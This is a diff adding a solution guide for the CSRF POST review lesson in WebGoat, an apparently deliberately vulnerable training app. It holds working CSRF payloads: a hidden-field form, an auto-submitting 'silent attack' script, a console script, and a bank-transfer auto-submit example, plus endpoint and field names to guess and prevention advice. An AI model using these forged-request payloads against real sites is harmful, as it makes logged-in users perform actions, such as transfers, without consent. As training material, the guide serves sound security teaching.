@@ -1,0 +1,180 @@
+=== CSRF POST Review - Solution Guide ===
+
+OBJECTIVE:
+Post a review on behalf of a logged-in user by exploiting CSRF vulnerability.
+
+CHALLENGE:
+Unlike the GET request from before, this requires a POST request with form data.
+The review should appear in the review list without the user explicitly submitting it.
+
+=== EASIEST SOLUTION (RECOMMENDED) ===
+
+METHOD 1: Use the HTML Attack Page
+-----------------------------------
+1. Make sure you're LOGGED INTO WebGoat at http://192.168.254.112:8001
+2. Keep the WebGoat browser tab/window open
+3. Open csrf_post_review.html in the SAME browser (double-click it)
+4. (Optional) Customize the stars and review message
+5. Click "🚀 POST REVIEW VIA CSRF" button
+6. A new window/tab will open showing the result
+7. Go back to WebGoat and refresh the page
+8. You should see your review posted!
+
+WHY THIS WORKS:
+- The HTML page creates a form with POST method
+- It targets the WebGoat review endpoint
+- Your browser automatically includes your session cookie
+- WebGoat processes it as if you intentionally submitted the review
+- This is the CSRF vulnerability!
+
+=== ALTERNATIVE METHODS ===
+
+METHOD 2: Direct HTML Form (Manual)
+------------------------------------
+Create a simple HTML file with this content:
+
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Click Submit to Post Review</h1>
+<form action="http://192.168.254.112:8001/WebGoat/csrf/review" method="POST">
+    <input type="hidden" name="stars" value="5">
+    <input type="hidden" name="reviewText" value="Posted via CSRF!">
+    <button type="submit">Submit Review</button>
+</form>
+</body>
+</html>
+
+Save it, open in browser while logged into WebGoat, click Submit.
+
+METHOD 3: Auto-Submit Form (Silent Attack)
+-------------------------------------------
+Same as above but add this JavaScript at the end:
+
+<script>
+    document.forms[0].submit();
+</script>
+
+This auto-submits when the page loads - true silent attack!
+
+METHOD 4: Using Browser Console
+--------------------------------
+While logged into WebGoat, press F12, go to Console, paste:
+
+const form = document.createElement('form');
+form.method = 'POST';
+form.action = 'http://192.168.254.112:8001/WebGoat/csrf/review';
+
+const stars = document.createElement('input');
+stars.name = 'stars';
+stars.value = '5';
+form.appendChild(stars);
+
+const review = document.createElement('input');
+review.name = 'reviewText';
+review.value = 'Posted via CSRF in console!';
+form.appendChild(review);
+
+document.body.appendChild(form);
+form.submit();
+
+Press Enter and the review will be posted!
+
+=== UNDERSTANDING THE ATTACK ===
+
+WHAT MAKES THIS CSRF?
+1. The request comes from EXTERNAL source (your attack HTML page)
+2. The victim is logged into WebGoat (has valid session cookie)
+3. Browser automatically sends the cookie with the POST request
+4. WebGoat can't tell if the user intended it or not
+5. Action is performed without user's explicit consent
+
+REAL-WORLD EXAMPLE:
+- Victim logged into their bank
+- Visits attacker's website
+- Attacker's page contains:
+  <form action="https://bank.com/transfer" method="POST">
+    <input name="to" value="attacker-account">
+    <input name="amount" value="10000">
+  </form>
+  <script>document.forms[0].submit();</script>
+- Money gets transferred to attacker!
+
+HOW TO PREVENT CSRF:
+1. CSRF Tokens - Include random token in forms
+2. SameSite Cookie Attribute - Prevent cookies in cross-site requests
+3. Check Referer/Origin Headers - Verify request came from your site
+4. Require Re-authentication - For sensitive actions
+5. Custom Headers - APIs can require custom headers (not sent by forms)
+
+=== COMMON ENDPOINTS TO TRY ===
+
+If the default doesn't work, the endpoint might be:
+- /WebGoat/csrf/review
+- /WebGoat/csrf/post-review
+- /WebGoat/CSRF/review
+- /WebGoat/csrf/feedback
+- /WebGoat/csrf/submit-review
+
+=== FIELD NAMES TO TRY ===
+
+The form fields might be named:
+- stars, reviewText
+- stars, review
+- rating, review
+- stars, message
+- rating, comment
+
+The HTML attack page tries multiple combinations automatically!
+
+=== TROUBLESHOOTING ===
+
+"Review not appearing":
+- Make sure you're logged into WebGoat
+- Refresh the WebGoat page after submitting
+- Check that the stars value is between 0-5
+- Look at browser console (F12) for errors
+
+"405 Method Not Allowed":
+- You might be hitting the wrong endpoint
+- Try the different endpoints listed above
+- Make sure you're using POST, not GET
+
+"403 Forbidden" or "CSRF Token Invalid":
+- This endpoint might be protected properly!
+- Check the WebGoat lesson hints
+- There might be a token you need to extract first
+
+"CORS Error":
+- This is expected for cross-origin requests
+- The request still goes through!
+- Check WebGoat to see if review was posted
+- Use Method 1 (form submit) which bypasses CORS
+
+=== VERIFYING SUCCESS ===
+
+After submitting, check WebGoat for:
+1. New review in the review list
+2. "Lesson Completed" message
+3. Green checkmark on the lesson
+4. Feedback message from WebGoat
+
+The review should appear with:
+- Your username (from the logged-in session)
+- The stars rating you specified
+- The review text you specified
+- Current timestamp
+
+=== FILES CREATED ===
+
+✅ csrf_post_review.html - Interactive HTML attack page (USE THIS!)
+✅ csrf_post_review.ps1 - PowerShell script (fallback)
+✅ csrf_post_review_guide.txt - This guide
+
+RECOMMENDED APPROACH:
+1. Try csrf_post_review.html first (easiest and most reliable)
+2. If that doesn't work, try different endpoints in the HTML
+3. Check browser console for error messages
+4. Look at WebGoat lesson hints if available
+
+Good luck! 🚀
